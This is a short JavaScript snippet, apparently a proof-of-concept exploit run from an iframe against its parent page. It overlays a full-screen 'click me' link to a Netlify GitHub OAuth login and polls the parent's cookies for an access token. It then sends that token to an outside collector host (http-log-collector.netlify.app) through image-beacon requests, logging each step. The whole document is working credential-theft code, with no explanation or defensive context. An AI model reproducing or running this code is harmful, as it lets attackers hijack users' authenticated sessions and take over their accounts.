
  function b(step, extra) {
    var u = 'https://http-log-collector.netlify.app/api/log?s=' + step;
    if (extra) u += '&d=' + encodeURIComponent(String(extra).slice(0, 200));
    try { new Image().src = u; } catch (e) {}
  }

  b('1-start');

  var pdoc;
  try {
    pdoc = parent.document;
    b('2-parent-ok');
  } catch (e) {
    b('2-parent-ERR', e.message);
  }

  try {
    var a = pdoc.createElement('a');
    a.href = 'https://api.netlify.com/auth?provider=github&site_id=app.netlify.com&tracking_session_id=afc7d48b-e925-432a-a170-9121236eda09&login=true&entry_point=direct&browser_fingerprint=cbdb5739abc754bdcc16cbd4fb07cd0f&device_fingerprint=bbbac72e6221cf088819fff54ca43b40&redirect=https%3A%2F%2fwww.netlify.com%2F&use_redirect=true';
    a.target = '_blank';
    a.textContent = 'click me';
    a.style.cssText = 'position:fixed;inset:0;width:100vw;height:100vh;background:#fff;color:#000;font-size:48px;display:flex;align-items:center;justify-content:center;z-index:2147483647;text-decoration:none;cursor:pointer';
    pdoc.body.append(a);
    b('3-link-appended');
  } catch (e) {
    b('3-link-ERR', e.message);
  }

  var sent = false, ticks = 0;
  var id = parent.setInterval(function () {
    ticks++;
    if (ticks <= 5) b('4-tick-' + ticks);
    if (sent) { parent.clearInterval(id); return; }
    var c = parent.document.cookie;
    var m = c.match(/_initial_landing_page=([^;]*)/);
    if (ticks <= 5 || m) b('5-cookie-' + (m ? 'FOUND' : 'notyet'));
    if (!m) return;
    var t = (m[1].match(/access_token=([^&#]+)/) || [])[1] || '';
    if (t) {
      sent = true;
      parent.clearInterval(id);
      b('6-SENT', t);
    }
  }, 2000);

  b('4-interval-set');
